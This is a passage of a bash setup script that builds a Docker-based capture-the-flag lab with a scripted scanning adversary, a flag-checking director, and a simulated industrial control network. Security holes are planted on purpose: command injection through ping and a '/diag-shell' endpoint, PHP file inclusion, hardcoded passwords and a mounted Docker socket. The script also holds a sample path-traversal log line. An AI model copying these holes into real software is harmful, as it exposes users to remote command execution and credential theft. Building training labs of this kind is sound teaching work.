    exit_code, _ = container.exec_run(f"ping -c 1 -W 2 {IT_NETWORK_CIDR[:-3]}.1")
    return exit_code == 0
def check_tool_integrity(container):
    if not container: return False
    print("[SKID_CONTROLLER] Checking tool integrity (/tmp)...")
    exit_code, _ = container.exec_run(f"touch {SABOTAGE_FILE} && rm {SABOTAGE_FILE}")
    return exit_code == 0
def signal_defeat():
    print("[SKID_CONTROLLER] Adversary defeated! Signaling Director to deploy next stage...")
    try:
        requests.post(DIRECTOR_URL, timeout=5)
        print("[SKID_CONTROLLER] Signal sent successfully.")
    except Exception as e:
        print(f"[SKID_CONTROLLER] Could not send signal to Director: {e}")
def adversary_loop():
    state = SkidState.STARTING
    frustration = 0
    while state != SkidState.DEFEATED:
        container = get_container()
        if not container:
            print("[SKID_CONTROLLER] Container not found.")
            state = SkidState.DEFEATED
            continue

        if state == SkidState.STARTING or state == SkidState.ACTIVE:
            if not check_network_access(container):
                print("[SKID_CONTROLLER] Network access failed! SKID is getting frustrated.")
                state = SkidState.NETWORK_BLOCKED
                frustration = 1
                continue
            if not check_tool_integrity(container):
                print("[SKID_CONTROLLER] Tool integrity failed! SKID's tools are sabotaged.")
                state = SkidState.TOOLS_SABOTAGED
                frustration = 1
                continue
            
            print(f"[SKID_VICIOUS] Is ACTIVE. Running normal scan on {IT_NETWORK_CIDR}")
            container.exec_run(f"nmap -T4 -F --top-ports 20 {IT_NETWORK_CIDR}", user=SKID_USER, detach=True)
            time.sleep(random.randint(30, 45))

        elif state == SkidState.NETWORK_BLOCKED:
            print(f"[SKID_VICIOUS] Is frustrated (network blocked). Frustration level: {frustration}")
            container.exec_run(f"echo 'They firewalled me! LAME!' >> {LOG_FILE}", user=SKID_USER)
            frustration += 1
            if frustration > 3: state = SkidState.DEFEATED
            time.sleep(15)

        elif state == SkidState.TOOLS_SABOTAGED:
            print(f"[SKID_VICIOUS] Is frustrated (tools sabotaged). Frustration level: {frustration}")
            container.exec_run(f"echo 'WHO BROKE MY SCRIPTZ?!' >> {LOG_FILE}", user=SKID_USER)
            frustration += 1
            if frustration > 3: state = SkidState.DEFEATED
            time.sleep(15)
    signal_defeat()
if __name__ == "__main__":
    print("[SKID_CONTROLLER] Advanced adversary controller started. Waiting for container...")
    time.sleep(20) # Wait for initial services to be up
    adversary_loop()
    print("[SKID_CONTROLLER] Adversary controller shutting down.")
EOF
    
    # Director Script - The central brain of the CTF
    cat > "$PROJECT_DIR/director/director.py" << 'EOF'
import os, subprocess, threading, requests, time, json
from twisted.internet.protocol import Factory, Protocol
from twisted.internet import reactor
from flask import Flask, request, Response, jsonify
try: import google.generativeai as genai
except ImportError: genai = None

PROJECT_PATH = "/opt/leviathan_ctf"
COMPOSE_FILE = os.path.join(PROJECT_PATH, "docker-compose.yml")
API_KEY = os.environ.get('GEMINI_API_KEY')

class ServiceHealthMonitor:
    def __init__(self):
        self.service_status = {}
        self.monitoring = True
        
    def check_service_health(self, service_name, profile=None):
        """Check if a service is healthy using docker-compose"""
        try:
            cmd = ["docker-compose", "-f", COMPOSE_FILE, "ps", "--format", "json"]
            if profile:
                cmd.extend(["--profile", profile])
            
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            services = json.loads(result.stdout) if result.stdout.strip() else []
            
            for service in services:
                if service.get('Service') == service_name:
                    state = service.get('State', 'unknown')
                    health = service.get('Health', 'unknown')
                    return state == 'running' and health in ['healthy', 'unknown']
            return False
        except Exception as e:
            print(f"[HEALTH] Error checking {service_name}: {e}")
            return False
    
    def wait_for_service_health(self, service_name, profile=None, timeout=120):
        """Wait for a service to become healthy"""
        print(f"[HEALTH] Waiting for {service_name} to become healthy...")
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            if self.check_service_health(service_name, profile):
                print(f"[HEALTH] {service_name} is healthy")
                return True
            time.sleep(5)
        
        print(f"[HEALTH] {service_name} failed to become healthy within {timeout}s")
        return False

health_monitor = ServiceHealthMonitor()

# Configuration and existing code...
if API_KEY and genai:
    try:
        genai.configure(api_key=API_KEY)
        print("[DIRECTOR] Gemini AI configured.")
    except Exception as e:
        print(f"[DIRECTOR] [ERROR] Gemini AI Failed: {e}. NPCs will use fallbacks.")
        API_KEY = None
else: 
    print("[DIRECTOR] No Gemini API key. NPCs will use pre-scripted responses.")

deployed_stages = set()

def deploy_stage(stage_name, profile, services):
    if stage_name in deployed_stages: 
        return f"{stage_name.upper()} already online."
    
    print(f"[DIRECTOR] Signal received. Deploying {stage_name.upper()}...")
    
    # Use profiles for better service management
    command = ["docker-compose", "-f", COMPOSE_FILE, "--profile", profile, "up", "--build", "-d"] + services
    
    try:
        subprocess.run(command, check=True, capture_output=True, text=True)
        
        # Wait for services to become healthy
        all_healthy = True
        for service in services:
            if not health_monitor.wait_for_service_health(service, profile, timeout=180):
                print(f"[DIRECTOR] [WARNING] Service {service} did not become healthy")
                all_healthy = False
        
        if all_healthy:
            deployed_stages.add(stage_name)
            print(f"[DIRECTOR] {stage_name.upper()} is now online and healthy.")
            return f"Signal confirmed. New infrastructure detected. {stage_name.upper()} is now online."
        else:
            print(f"[DIRECTOR] {stage_name.upper()} deployed but some services are unhealthy.")
            return f"Signal confirmed. {stage_name.upper()} deployed with warnings."
            
    except subprocess.CalledProcessError as e:
        print(f"[DIRECTOR] [ERROR] Deploying {stage_name.upper()}: {e.stderr}")
        return "ERROR: Anomaly in deployment signal."

flask_app = Flask(__name__)

@flask_app.route('/diag-shell', methods=['POST'])
def diag_shell():
    cmd = request.form.get('cmd')
    try: 
        return Response(subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True), 
                       mimetype='text/plain')
    except Exception as e: 
        return Response(str(e), status=500, mimetype='text/plain')

@flask_app.route('/health')
def health_check():
    """Health endpoint for monitoring"""
    status = {
        'status': 'healthy',
        'deployed_stages': list(deployed_stages),
        'timestamp': time.time()
    }
    return jsonify(status)

@flask_app.route('/signal/skid_shutdown', methods=['POST'])
def skid_shutdown_signal():
    print("[DIRECTOR] SKID_VICIOUS neutralized signal received. A new target is emerging...")
    result = deploy_stage("Gibson Mainframe", "gibson", ["gibson"])
    
    # Create clue file after IT network is confirmed deployed
    clue_path = os.path.join(PROJECT_PATH, 'fileserv_it/shares/Admin-Notes/mainframe_activated.txt')
    it_net_dir = os.path.dirname(clue_path)
    if os.path.exists(it_net_dir):
        with open(clue_path, 'w') as f:
            f.write("SysAdmin Note: The legacy mainframe (172.16.20.100) has been brought online for data migration after we neutralized the script kiddie.\n")
    
    return "ACK"

def run_flask(): 
    flask_app.run(host='0.0.0.0', port=5000)

# Updated FLAG_ACTIONS to use profiles
FLAG_ACTIONS = {
    os.environ.get('FLAG_PHASE2'): lambda: deploy_stage("IT Network", "it-network", ["fileserv-it", "eng-workstation", "blackswan-c2"]),
    os.environ.get('FLAG_PHASE4'): lambda: deploy_stage("OT Network", "ot-network", ["leviathan-plc", "leviathan-hmi", "leviathan-scada", "leviathan-historian"]),
}

FLAG_RESPONSES = {
    os.environ.get('FLAG_PHASE1'): "Phase 1 Complete. You're inside the jumpbox. Someone else is making a lot of noise... investigate.",
    os.environ.get('FLAG_PHASE3'): "Phase 3 Complete. The Engineer's credentials are the key.",
    os.environ.get('FLAG_PHASE5'): "MISSION COMPLETE. You've triggered the meltdown and been framed.",
    os.environ.get('FLAG_PHASE6'): "Adversary C2 neutralized.",
    os.environ.get('BONUS_FLAG'): "BONUS: You see the truth. Shadow is watching."
}

class FlagChecker(Protocol):
    def dataReceived(self, data):
        flag = data.decode('utf-8').strip()
        response = FLAG_ACTIONS.get(flag, lambda: FLAG_RESPONSES.get(flag, "INVALID FLAG."))()
        self.transport.write(response.encode('utf-8') + b'\n')
        self.transport.loseConnection()

class CanaryGhostChat(Protocol):
    def connectionMade(self): 
        self.peer_ip = self.transport.getPeer().host
    
    def dataReceived(self, data):
        user_message = data.decode('utf-8').strip()
        if (user_message == os.environ.get('CANARY_CODENAME') and 
            self.peer_ip == os.environ.get('GHOST_ORIGIN_IP')):
            self.transport.write(b"Thank god. To prove the frame-up, you need OT access. The password hint for the Engineering Workstation is on the IT file server - something about the project's founding.\n")
        else: 
            self.transport.write(b"Who is this? This isn't a secure channel. Go away!\n")
        self.transport.loseConnection()

if __name__ == "__main__":
    print("[DIRECTOR] Launching SKID_VICIOUS adversary controller...")
    subprocess.Popen(["python", "-u", "skid_controller.py"])
    
    threading.Thread(target=run_flask, daemon=True).start()
    
    print("[DIRECTOR] Flag submission, NPC, and Staged Deployment controller is online.")
    reactor.listenTCP(int(os.environ.get('DIRECTOR_FLAG_PORT')), Factory.forProtocol(FlagChecker))
    reactor.listenTCP(int(os.environ.get('CANARY_GHOST_PORT')), Factory.forProtocol(CanaryGhostChat))
    reactor.run()
EOF

    # Web DMZ, SSH Jumpbox, and Fileserver assets
    echo "[DEBUG] About to create web_dmz files..."
    echo "[DEBUG] Checking if $PROJECT_DIR/web_dmz/www exists..."
    if [ ! -d "$PROJECT_DIR/web_dmz/www" ]; then
        echo "[ERROR] Directory $PROJECT_DIR/web_dmz/www does not exist!"
        echo "[DEBUG] Current PROJECT_DIR: $PROJECT_DIR"
        echo "[DEBUG] Current working directory: $(pwd)"
        echo "[DEBUG] Contents of PROJECT_DIR:"
        ls -la "$PROJECT_DIR" 2>/dev/null || echo "Cannot list PROJECT_DIR"
        echo "[DEBUG] Attempting to create missing directories..."
        mkdir -p "$PROJECT_DIR/web_dmz/www" || { echo "[ERROR] Failed to create web_dmz/www directory"; exit 1; }
        echo "[DEBUG] Successfully created web_dmz/www directory"
    fi
    echo "[DEBUG] Directory exists, creating index.php..."
    cat > "$PROJECT_DIR/web_dmz/www/index.php" << 'EOF'
<?php
$page = $_GET['page'] ?? 'home.html';
if (strpos($page, '..') === false) { @include($page); } 
else { echo "Invalid path detected."; }
?>
EOF
    cat > "$PROJECT_DIR/web_dmz/www/home.html" << 'EOF'
<h1>Acheron Corp Intranet</h1><p>Public access terminal. Check server logs for maintenance details.</p>
EOF
    mkdir -p "$PROJECT_DIR/web_dmz/secrets"
    echo "GHOST_USER_PASSWORD=LeviathanAwakens77" > "$PROJECT_DIR/web_dmz/secrets/deployment_secrets.conf"
    
    # Check and create ssh_jump directory before creating files
    echo "[DEBUG] About to create ssh_jump files..."
    echo "[DEBUG] Checking if $PROJECT_DIR/ssh_jump exists..."
    if [ ! -d "$PROJECT_DIR/ssh_jump" ]; then
        echo "[ERROR] Directory $PROJECT_DIR/ssh_jump does not exist!"
        echo "[DEBUG] Attempting to create missing ssh_jump directory..."
        mkdir -p "$PROJECT_DIR/ssh_jump" || { echo "[ERROR] Failed to create ssh_jump directory"; exit 1; }
        echo "[DEBUG] Successfully created ssh_jump directory"
    fi
    echo "[DEBUG] ssh_jump directory exists, creating skid_notes.txt..."
    echo "my legend: $FLAG_PHASE2" > "$PROJECT_DIR/ssh_jump/skid_notes.txt"
    cat > "$PROJECT_DIR/ssh_jump/start.sh" << 'EOF'
#!/bin/bash
echo "[*] Configuring firewall..."

# Add the rule to allow incoming SSH traffic BEFORE enabling the firewall.
# This is the critical fix.
ufw allow ssh

# Now, enable the firewall with the new rule in place.
echo "[*] Enabling firewall..."
ufw --force enable

echo "[*] Firewall configured. Starting SSH daemon..."
# Start the SSH service in the foreground to keep the container running.
/usr/sbin/sshd -D
EOF
    cat > "$PROJECT_DIR/ssh_jump/employee_contact_list.csv" << EOF
name,dept,contact_method,notes
"Skid Vicious",Unknown,ssh,"Noisy account, constantly scanning things."
"Canary",Engineering,"chat @ ${DIRECTOR_IP}:${CANARY_GHOST_PORT}","Contact protocol is classified. Search other systems."
EOF
    
    # Create all remaining directories before creating files
    echo "[DEBUG] Creating all remaining directories..."
    remaining_dirs=(
        "fileserv_it/shares/Admin-Notes"
        "leviathan-plc"
        "leviathan-hmi/www"
        "leviathan-scada"
        "leviathan-historian"
        "blackswan_c2/app"
        "tor_service/app/templates"
        "tor_service/app/static"
        "tor_service/hidden_service"
        "eng_workstation/projects"
    )
    
    for dir in "${remaining_dirs[@]}"; do
        full_path="$PROJECT_DIR/$dir"
        echo "[DEBUG] Creating directory: $full_path"
        mkdir -p "$full_path" || { echo "[ERROR] Failed to create directory: $full_path"; exit 1; }
    done
    echo "[DEBUG] All remaining directories created successfully."
    
    cat > "$PROJECT_DIR/fileserv_it/shares/Admin-Notes/ot_network_warning.txt" << EOF
Subject: SECURITY ALERT - Leviathan OT Network
The Engineering Workstation (${ENG_WORKSTATION_IP}) is the ONLY system permitted to access the 10.0.50.0/24 OT network.
Password policy reminder: Our founding year (2012) followed by the project name (Leviathan).
EOF

    # Full OT Simulation Stack
    cat > "$PROJECT_DIR/leviathan-plc/plc_simulator.py" << 'EOF'
import time, random, math, os
from pymodbus.server.sync import StartTcpServer
from pymodbus.datastore import ModbusSlaveContext, ModbusServerContext, ModbusSequentialDataBlock
from threading import Thread
class PLCSimulator:
    def __init__(self):
        self.coils = ModbusSequentialDataBlock(0, [True, False] * 5)
        self.holding_registers = ModbusSequentialDataBlock(0, [200, 0, 0, 0, 0])
        self.input_registers = ModbusSequentialDataBlock(0, [250] * 10)
        self.context = ModbusServerContext(slaves=ModbusSlaveContext(co=self.coils, hr=self.holding_registers, ir=self.input_registers), single=True)
        Thread(target=self.simulate_process, daemon=True).start()
    def simulate_process(self):
        temp, cycle = 25.0, 0
        while True:
            pump_on = self.coils.getValues(0, 1)[0]
            heater_on = self.coils.getValues(1, 1)[0]
            interlock_active = self.holding_registers.getValues(2,1)[0] == 0
            if pump_on: temp -= 0.5
            else: temp += 1.0
            if heater_on and not pump_on and not interlock_active: temp += 4.0
            self.input_registers.setValues(0, [int(temp + 5 * math.sin(cycle * 0.1))])
            if temp > 700:
                self.holding_registers.setValues(0, [404])
                print(f"CRITICAL MELTDOWN! FLAG: {os.environ.get('FLAG_PHASE5')}", flush=True)
            else: self.holding_registers.setValues(0, [200])
            cycle += 1; time.sleep(1)
    def start_server(self):
        print("Leviathan PLC Simulator Online."); StartTcpServer(self.context, address=("0.0.0.0", 502))
if __name__ == "__main__": PLCSimulator().start_server()
EOF
    cat > "$PROJECT_DIR/leviathan-hmi/www/index.html" << 'EOF'
<!DOCTYPE html><html lang="en"><head><title>Leviathan HMI</title>
<style>body{font-family:monospace;background:#000;color:#0ff;} #temp.critical{color:red;animation: blinker 1s linear infinite;} @keyframes blinker {50% {opacity: 0;}}</style></head>
<body><h1>Leviathan Plant Status</h1><h2 id="status">STATUS: <span id="sys_status">--</span></h2>
<h3>CORE TEMPERATURE: <span id="temp">--</span> &deg;C</h3>
<script>
async function fetchData(){
const res=await fetch('/api/data');const data=await res.json();
document.getElementById('sys_status').textContent=data.system_status==404?'CRITICAL':'STABLE';
const tempEl=document.getElementById('temp');tempEl.textContent=data.temperature;
if(data.system_status==404){tempEl.classList.add('critical');}else{tempEl.classList.remove('critical');}
}
setInterval(fetchData,1000);fetchData();
</script></body></html>
EOF
    cat > "$PROJECT_DIR/leviathan-hmi/nginx.conf" << 'EOF'
server { listen 80; location / { root /usr/share/nginx/html; } location /api/ { proxy_pass http://10.0.50.30:5000; } }
EOF
    cat > "$PROJECT_DIR/leviathan-scada/app.py" << 'EOF'
from flask import Flask, jsonify, request, abort, send_from_directory
from pymodbus.client.sync import ModbusTcpClient
app = Flask(__name__)
PLC_HOST = '10.0.50.10'
@app.route('/api/data')
def get_data():
    client = ModbusTcpClient(PLC_HOST, port=502); client.connect()
    temp = client.read_input_registers(0, 1).registers[0]
    status = client.read_holding_registers(0, 1).registers[0]
    client.close(); return jsonify({'temperature': temp, 'system_status': status})
@app.route('/api/control', methods=['POST'])
def control():
    req = request.json
    client = ModbusTcpClient(PLC_HOST, port=502); client.connect()
    if 'coil' in req: client.write_coil(int(req['coil']), int(req['value']))
    elif 'register' in req: client.write_register(int(req['register']), int(req['value']))
    client.close(); return jsonify({'status': 'Command sent.'})
@app.route('/api/logs')
def get_logs():
    try: return send_from_directory('.', 'app.py')
    except FileNotFoundError: abort(404)
if __name__ == '__main__': app.run(host='0.0.0.0', port=5000)
EOF
    cat > "$PROJECT_DIR/leviathan-historian/init.sql" << 'EOF'
CREATE USER scada_user WITH PASSWORD 'AcheronSecurityIsALie';
CREATE TABLE event_logs (id SERIAL PRIMARY KEY, timestamp TIMESTAMPTZ, user_id VARCHAR(50), message TEXT);
GRANT ALL PRIVILEGES ON TABLE event_logs to scada_user;
INSERT INTO event_logs (timestamp, user_id, message) VALUES
(NOW() - INTERVAL '6 months', 'prometheus', 'They implemented a software interlock on the heater, tying it to Holding Register 2. If HR[2] is 0, the heater cannot be activated. A value of 1 bypasses it. They think this makes it safe. They are wrong.');
EOF

    # Black Swan C2 Adversary
    cat > "$PROJECT_DIR/blackswan_c2/app/app.py" << 'EOF'
import os
from flask import Flask, request
app = Flask(__name__)
@app.route('/diag')
def diag():
    target = request.args.get('host', '127.0.0.1')
    return f"<pre>{os.popen(f'ping -c 1 {target}').read()}</pre>"
if __name__ == '__main__': app.run(host='0.0.0.0', port=80)
EOF
    (cd "$PROJECT_DIR/blackswan_c2" && git init && git -c user.name='Deploy' -c user.email='d@d.com' commit --allow-empty -m "Initial commit" &>/dev/null)
    cat > "$PROJECT_DIR/blackswan_c2/README.md" << EOF
My plan was flawless. Taking control of the grid would have been the ultimate hack. FLAG: $FLAG_PHASE6
I heard the Acheron 'director' service (${DIRECTOR_IP}) has a hidden diagnostic endpoint on port 5000.
They probably reused the same insecure code we did for our ping tool. Look for a path like '/diag-shell'.
EOF

    # Tor Service & Steganography Puzzle
    cat > "$PROJECT_DIR/tor_service/app/app.py" <<'EOF'
import os
from flask import Flask, render_template
app = Flask(__name__)
log_file = "/surveillance/ghost_watch.log"
ghost_home = "/ghost_home"
@app.route('/')
def index():
    try: logs = open(log_file, 'r').read()
    except Exception as e: logs = f"Error reading logs: {e}"
    try: file_tree = os.popen(f'tree -L 2 {ghost_home}').read()
    except Exception as e: file_tree = f"Error generating file tree: {e}"
    return render_template('index.html', logs=logs, file_tree=file_tree)
if __name__ == '__main__': app.run(host='0.0.0.0', port=80)
EOF
    cat > "$PROJECT_DIR/tor_service/app/templates/index.html" <<'EOF'
<!DOCTYPE html><html lang="en"><head><title>SUBJECT: 0xGHOST - LIVE SURVEILLANCE</title>
<style>body{background:#111;color:#f00;font-family:monospace;} .container{display:flex;} .pane{width:50%;padding:10px;border:1px solid #333;}</style></head><body>
<h1>SUBJECT: 0xGHOST - LIVE SURVEILLANCE</h1><p>Suspect in Acheron breach. Frame-up is proceeding.</p><hr>
<div class="container"><div class="pane"><h2>KEYSTROKE LOG</h2><pre id="logs" style="height:300px;overflow-y:scroll;border:1px solid #f00;white-space: pre-wrap; word-wrap: break-word;">{{ logs }}</pre></div>
<div class="pane"><h2>FILESYSTEM VIEW (/home/ghost)</h2><pre>{{ file_tree }}</pre></div></div>
<script>setInterval(()=>location.reload(),5000);</script></body></html>
EOF
    cat > "$PROJECT_DIR/tor_service/torrc" <<EOF
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:80
Log notice stdout
EOF
}

generate_tor_hostname_and_puzzle() {
    echo "[*] Generating fallback .onion address and steganography puzzle..."
    ONION_ADDRESS="ghostframe$(printf "%04x" $RANDOM)$(printf "%04x" $RANDOM).onion"
    mkdir -p "$PROJECT_DIR/tor_service/hidden_service"
    echo "$ONION_ADDRESS" > "$PROJECT_DIR/tor_service/hidden_service/hostname"
    echo "[INFO] Generated fallback .onion address for puzzle: $ONION_ADDRESS"
    
    SHADOW_DOCS="/home/$SHADOW_USER/ops/mission_docs"
    ONION_SECRET_TEXT="Find the truth at: http://$ONION_ADDRESS -- $BONUS_FLAG"
    SECRET_FILE="$SHADOW_DOCS/onion.txt"
    echo "$ONION_SECRET_TEXT" > "$SECRET_FILE"
    HINT_JPG="$SHADOW_DOCS/hint.jpg"
    convert -size 800x600 xc:black -pointsize 24 -fill white -gravity center -draw "text 0,0 'CLASSIFIED DOCUMENT\n\nPassword: $SHADOW_PASS'" "$HINT_JPG"
    steghide embed -cf "$HINT_JPG" -ef "$SECRET_FILE" -p "$SHADOW_PASS" -f > /dev/null
    rm "$SECRET_FILE"
    chown -R $SHADOW_USER:$SHADOW_USER "/home/$SHADOW_USER"
}

write_docker_compose_and_dockerfiles() {
    echo "[*] Writing all container Dockerfiles..."
    
    cat > "$PROJECT_DIR/director/Dockerfile" << 'EOF'
FROM python:3.9-slim
RUN apt-get update && apt-get install -y docker.io docker-compose && rm -rf /var/lib/apt/lists/*
RUN pip install twisted "google-generativeai>=0.4.0" docker flask requests
RUN useradd -ms /bin/bash app && usermod -aG docker app
COPY . .
USER app
CMD ["python", "-u", "director.py"]
EOF
    cat > "$PROJECT_DIR/web_dmz/Dockerfile" << 'EOF'
FROM php:7.4-apache
COPY ./www /var/www/html/
RUN mkdir -p /etc/acheron_corp
COPY ./secrets/deployment_secrets.conf /etc/acheron_corp/deployment_secrets.conf
RUN rm -f /var/log/apache2/access.log && touch /var/log/apache2/access.log && \
    echo '127.0.0.1 - - [01/Jan/2023:12:00:00 +0000] "GET /?page=../../../../etc/acheron_corp/deployment_secrets.conf HTTP/1.1" 200 - "-" "AdminBrowser/1.0"' > /var/log/apache2/access.log
EOF
    cat > "$PROJECT_DIR/ssh_jump/Dockerfile" << 'EOF'
FROM ubuntu:22.04
ARG SKID_USER
ARG SKID_PASS
RUN apt-get update && apt-get install -y openssh-server sudo nmap netcat-traditional ufw
RUN useradd -ms /bin/bash ghost && echo "ghost:LeviathanAwakens77" | chpasswd
RUN echo "ghost ALL=(ALL) NOPASSWD: /usr/sbin/ufw" >> /etc/sudoers
RUN useradd -ms /bin/bash ${SKID_USER} && echo "${SKID_USER}:${SKID_PASS}" | chpasswd
COPY --chown=${SKID_USER}:${SKID_USER} skid_notes.txt /home/${SKID_USER}/README.txt
RUN mkdir /var/run/sshd && echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config
COPY start.sh /start.sh
RUN chmod +x /start.sh
CMD ["/start.sh"]
EOF
    cat > "$PROJECT_DIR/fileserv_it/Dockerfile" << 'EOF'
FROM dperson/samba
CMD ["-p", "-s", "Admin-Notes;/shares/Admin-Notes;yes;yes;yes;guest", "-s", "temp-share;/shares/temp-share;yes;yes;yes;all;all"]
EOF
    cat > "$PROJECT_DIR/blackswan_c2/Dockerfile" << 'EOF'
FROM python:3.9-slim
RUN pip install flask && apt-get update && apt-get install -y iputils-ping && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY ./app .
COPY ./README.md /README.md
CMD ["python", "app.py"]
EOF
    cat > "$PROJECT_DIR/tor_service/Dockerfile" << 'EOF'
FROM debian:bullseye-slim
RUN apt-get update && apt-get install -y tor python3-pip tree && pip3 install flask
COPY ./app /app
COPY ./torrc /etc/tor/torrc
RUN chown -R debian-tor:debian-tor /var/lib/tor/
USER debian-tor
WORKDIR /app
CMD tor & python3 app.py
EOF
    cat > "$PROJECT_DIR/eng_workstation/Dockerfile" << 'EOF'
FROM ubuntu:22.04
RUN apt-get update && apt-get install -y openssh-server sudo nmap netcat-traditional python3-pip postgresql-client cifs-utils && pip3 install pymodbus==2.5.3
RUN useradd -ms /bin/bash eng_user && echo "eng_user:2012Leviathan" | chpasswd
RUN mkdir -p /home/eng_user/projects && chown -R eng_user:eng_user /home/eng_user && mkdir /var/run/sshd
CMD ["/usr/sbin/sshd", "-D"]
EOF
    cat > "$PROJECT_DIR/leviathan-plc/Dockerfile" << 'EOF'
FROM python:3.9-slim
RUN pip install pymodbus==2.5.3
COPY . /app/
WORKDIR /app
CMD ["python", "-u", "plc_simulator.py"]
EOF
    cat > "$PROJECT_DIR/leviathan-hmi/Dockerfile" << 'EOF'
FROM nginx:alpine
COPY ./www/ /usr/share/nginx/html/
COPY ./nginx.conf /etc/nginx/conf.d/default.conf
EOF
    cat > "$PROJECT_DIR/leviathan-scada/Dockerfile" << 'EOF'
FROM python:3.9-slim
RUN pip install Flask pymodbus==2.5.3 psycopg2-binary
COPY . /app
WORKDIR /app
CMD ["python", "app.py"]
EOF
    cat > "$PROJECT_DIR/leviathan-historian/Dockerfile" << 'EOF'
FROM postgres:13-alpine
COPY init.sql /docker-entrypoint-initdb.d/init.sql
EOF

    echo "[*] Writing enhanced docker-compose.yml with health checks..."
    cat > "$PROJECT_DIR/docker-compose.yml" << 'EOF'
version: '3.8'

volumes:
  skid_sabotage_volume: {}

services:
  director:
    build: ./director
    container_name: director
    ports: ["5000:5000", "${DIRECTOR_FLAG_PORT}:${DIRECTOR_FLAG_PORT}", "${CANARY_GHOST_PORT}:${CANARY_GHOST_PORT}"]
    volumes: ["/var/run/docker.sock:/var/run/docker.sock", ".:/opt/leviathan_ctf"]
    environment:
      FLAG_PHASE1: ${FLAG_PHASE1}
      FLAG_PHASE2: ${FLAG_PHASE2}
      FLAG_PHASE3: ${FLAG_PHASE3}
      FLAG_PHASE4: ${FLAG_PHASE4}
      FLAG_PHASE5: ${FLAG_PHASE5}
      FLAG_PHASE6: ${FLAG_PHASE6}
      BONUS_FLAG: ${BONUS_FLAG}
      GEMINI_API_KEY: ${GEMINI_API_KEY}
      GHOST_ORIGIN_IP: ${SSH_JUMP_CONTROL_IP}
      CANARY_CODENAME: ${CANARY_CODENAME}
      DIRECTOR_FLAG_PORT: ${DIRECTOR_FLAG_PORT}
      CANARY_GHOST_PORT: ${CANARY_GHOST_PORT}
    networks:
      control_net:
        ipv4_address: ${DIRECTOR_IP}
    healthcheck:
      test: ["CMD", "python3", "-c", "import socket; s=socket.socket(); s.connect(('localhost', 5000)); s.close()"]
      interval: 10s
      timeout: 5s
      retries: 3
      start_period: 30s

  web-dmz:
    build: ./web_dmz
    container_name: web-dmz
    ports: ["80:80"]
    networks:
      dmz_net:
        ipv4_address: ${WEB_DMZ_IP}
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost/"]
      interval: 10s
      timeout: 5s
      retries: 3
      start_period: 10s

  ssh-jump:
    build:
      context: ./ssh_jump
      args:
        SKID_USER: ${SKID_USER}
        SKID_PASS: ${SKID_PASS}
    container_name: ssh-jump
    ports: ["2222:22"]
    cap_add: [NET_ADMIN]
    volumes:
      - ./ssh_jump/employee_contact_list.csv:/home/ghost/employee_contact_list.csv:ro
      - skid_sabotage_volume:/tmp
    networks:
      dmz_net:
        ipv4_address: ${SSH_JUMP_DMZ_IP}
      it_corp_net: {}
      control_net:
        ipv4_address: ${SSH_JUMP_CONTROL_IP}
    healthcheck:
      test: ["CMD", "nc", "-z", "localhost", "22"]
      interval: 10s
      timeout: 5s
      retries: 3
      start_period: 15s

  tor_service:
    build: ./tor_service
    container_name: tor-exposed
    volumes: 
      - "/home/shadow_op/ops/ghost_watch.log:/surveillance/ghost_watch.log:ro"
      - "/home/ghost:/ghost_home:ro"
      - "./tor_service/hidden_service:/var/lib/tor/hidden_service"
    networks:
      control_net:
        ipv4_address: ${TOR_SERVICE_IP}
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost/"]
      interval: 15s
      timeout: 10s
      retries: 3
      start_period: 30s

  # IT Network Services (deployed dynamically)
  fileserv-it:
    build: ./fileserv_it
    container_name: fileserv-it
    volumes:
      - ./fileserv_it/shares:/shares:ro
      - skid_sabotage_volume:/shares/temp-share
    networks:
      it_corp_net:
        ipv4_address: ${FILESERV_IT_IP}
    healthcheck:
      test: ["CMD", "nc", "-z", "localhost", "445"]
      interval: 15s
      timeout: 5s
      retries: 3
    profiles: ["it-network"]

  eng-workstation:
    build: ./eng_workstation
    container_name: eng-workstation
    networks:
      it_corp_net:
        ipv4_address: ${ENG_WORKSTATION_IP}
      ot_secure_net: {}
      blackswan_c2_net: {}
    healthcheck:
      test: ["CMD", "nc", "-z", "localhost", "22"]
      interval: 10s
      timeout: 5s
      retries: 3
    profiles: ["it-network"]

  blackswan-c2:
    build: ./blackswan_c2
    container_name: blackswan-c2
    networks:
      blackswan_c2_net:
        ipv4_address: ${BLACKSWAN_C2_IP}
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost/"]
      interval: 10s
      timeout: 5s
      retries: 3
    profiles: ["it-network"]

  # OT Network Services (deployed dynamically)
  leviathan-plc:
    build: ./leviathan-plc
    container_name: leviathan-plc
    environment:
      FLAG_PHASE5: ${FLAG_PHASE5}
    networks:
      ot_secure_net:
        ipv4_address: ${PLC_SIM_IP}
    healthcheck:
      test: ["CMD", "python3", "-c", "from pymodbus.client.sync import ModbusTcpClient; c=ModbusTcpClient('localhost', 502); c.connect(); c.close()"]
      interval: 15s
      timeout: 5s
      retries: 3
    profiles: ["ot-network"]

  leviathan-hmi:
    build: ./leviathan-hmi
    container_name: leviathan-hmi
    ports: ["8080:80"]
    networks:
      ot_secure_net:
        ipv4_address: ${HMI_DASH_IP}
    depends_on:
      leviathan-scada: 
        condition: service_healthy 
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost/"]
      interval: 10s
      timeout: 5s
      retries: 3
    profiles: ["ot-network"]

  leviathan-scada:
    build: ./leviathan-scada
    container_name: leviathan-scada
    networks:
      ot_secure_net:
        ipv4_address: ${SCADA_SERVER_IP}
    depends_on:
      leviathan-plc:
        condition: service_healthy
      leviathan-historian:
        condition: service_healthy
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:5000/api/data"]
      interval: 15s
      timeout: 5s
      retries: 3
    profiles: ["ot-network"]

  leviathan-historian:
    build: ./leviathan-historian
    container_name: leviathan-historian
    environment:
      POSTGRES_PASSWORD: "somepassword"
    networks:
      ot_secure_net:
        ipv4_address: ${HISTORIAN_DB_IP}
    healthcheck:
      test: ["CMD", "pg_isready", "-U", "postgres"]
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 30s
    profiles: ["ot-network"]

